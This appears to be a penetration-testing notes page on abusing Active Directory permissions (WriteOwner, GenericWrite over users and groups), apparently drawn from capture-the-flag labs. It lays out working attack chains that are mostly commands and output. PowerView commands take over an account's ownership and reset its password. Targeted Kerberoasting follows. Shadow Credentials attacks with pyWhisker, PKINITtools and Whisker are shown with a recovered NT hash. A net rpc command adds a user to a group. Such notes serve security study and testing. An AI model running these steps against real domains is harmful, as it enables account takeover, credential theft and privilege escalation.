# Abusing Active Directory ACLs/ACEs

## "WriteOwner" abuse

We have two account "Ryan" and "CA\_SVC".

<figure><img src="../../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

As you can see, ryan has WriteOwner privilege on "sv\_svc" AD account.

### **Set Owner with All Rights** <a href="#dc7f" id="dc7f"></a>

```powershell
powershell -ep bypass

Import-Module .\PowerView.ps1

Set-DomainObjectOwner -Identity 'ca_svc' -OwnerIdentity 'ryan'

Add-DomainObjectAcl -Rights 'All' -TargetIdentity "ca_svc" -PrincipalIdentity "ryan"
```

Check with this command:

{% code title="" overflow="wrap" %}
```powershell
# check SID of ryan
Get-DomainUser | Where-Object { $_.Name -like "*ryan*" } | Select-Object Name, Objectsid
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

{% code title="" overflow="wrap" %}
```powershell
# check if ryan's SID there is in SecurityIdentifier field of ca_svc account
Get-DomainObjectAcl -Identity 'ca_svc' | Where-Object { $_.ActiveDirectoryRights -eq 'GenericAll' }
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

### Reset Password

```powershell
$NewPassword = ConvertTo-SecureString 'Password9999' -AsPlainText -Force

Set-DomainUserPassword -Identity 'ca_svc' -AccountPassword $NewPassword
```



### Reources

{% embed url="https://medium.com/@aslam.mahimkar/exploiting-ad-dacl-writeowner-misconfiguration-ca61fb2fcee1" %}

## "GenericWrite" over a user abuse.

The GenericWrite privilege access grants you the ability to write to any non-protected attribute on the target object, including "members" for a gourp, and "serviceprincipalnames" for a user.

This means that that it is possible to perform a `kerberstoasting attack` or `Shadow Credentials Attack` from the user with this priv to the writable user.

<figure><img src="../../../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

### Kerberoast attack

A targeted kerberoast attack can be performed using [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast).

{% code title="Installation" %}
```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast
```
{% endcode %}

{% code title="Usage" overflow="wrap" %}
```bash
./targetedKerberoast.py --dc-ip '192.168.1.7' -v -d 'ignite.local' -u 'radha' -p 'Password@1'
```
{% endcode %}

#### Clock skew too great error

The `KRB_AP_ERR_SKEW(Clock skew too great)` error indicates that we have to syncronize the clock of out session with the clock of the AD.

To do this we can use the `ntpdate`tool:

```bash
sudo apt install ntpsec-ntpdate
```

```bash
sudo ntpdate 10.10.11.42
```

{% hint style="danger" %}
If we are in kali linux we also disable the auto ntp-sync with this command:

`timedatectl set-ntp 0`
{% endhint %}

### Shadow Credentials Attack (From Kali)

To abuse this privilege, use [pyWhisker](https://github.com/ShutdownRepo/pywhisker).

{% code title="Installation" %}
```bash
git clone https://github.com/ShutdownRepo/pywhisker
```
{% endcode %}

{% code title="" overflow="wrap" %}
```bash
pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

Now we have obtained the password for pfx file and the pfx file, using the `gettgtpkinit.py` tool to extract TGT ticket.

{% code title="Installation" %}
```bash
git clone https://github.com/dirkjanm/PKINITtools
```
{% endcode %}

{% code overflow="wrap" %}
```bash
cd PKINITtools

python gettgtpkinit.py -cert-pfx file.pfx -pfx-pass password -cert-pem file_cert.pem -key-pem file_priv.pem -dc-ip 10.10.11.42 DOMAIN/USER USER.ccache

# output
2025-05-29 00:01:47,532 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-05-29 00:01:47,561 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-05-29 00:01:57,426 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-05-29 00:01:57,426 minikerberos INFO     f83293eb50d924cd718551e3b431c5b2a9a894bab853257d56bb255f84e13721 # <---------
INFO:minikerberos:f83293eb50d924cd718551e3b431c5b2a9a894bab853257d56bb255f84e13721
2025-05-29 00:01:57,428 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file

```
{% endcode %}

Set the **KRB5CCNAME** environment variable to point to the previously generated **`.ccache`** file

```bash
export KRB5CCNAME=/PATH/TO/PKINITtools/USER.ccache
```

Use `getnthash.py` tool to extract the hash from TGT ticket

{% code overflow="wrap" %}
```bash
python getnthash.py -key KEY_IN_THE_ABOVE_OUTPUT DOMAIN/USER

# output
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
33bd09dcd697600edf6b3a7af4875767
```
{% endcode %}



### Shadow Credentials Attack (From powershell)

copy this file on the target machine:

```bash
locate Whisker.exe

/opt/SharpCollection/NetFramework_4.7_Any/Whisker.exe
/opt/SharpCollection/NetFramework_4.7_x64/Whisker.exe
/opt/SharpCollection/NetFramework_4.7_x86/Whisker.exe
```

With a evil-winrm session we can use "upload" function

```
upload Whisker.exe
```

Execute the program

```
Whisker.exe list /target:TARGET_USER
```

```
Whisker.exe add /target:TARGET_USER
```

<figure><img src="../../../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

Now upload the `Rubeus.exe` program and execute the command from Whisker output.



## "GenericWrite" over a group abuse.

GenericWrite to a group allows you to directly modify group membership of the group.

<figure><img src="../../../../.gitbook/assets/image (257).png" alt=""><figcaption></figcaption></figure>

### Add user to the other group

The command is based on the above example, and it add a user into a other group.

{% code overflow="wrap" %}
```bash
net rpc group addmem "DEVELOPERS" levi.james -U puppy.htb/levi.james%'Password@1' -S DC_IP
```
{% endcode %}

After running the command, run the following command to view the group members and check whether the previous command worked.

{% code overflow="wrap" %}
```bash
net rpc group members "DEVELOPERS" -U puppy.htb/levi.james%'Passwprd@1' -S DC_IP
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (260).png" alt=""><figcaption></figcaption></figure>



### Resources

{% embed url="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials" %}
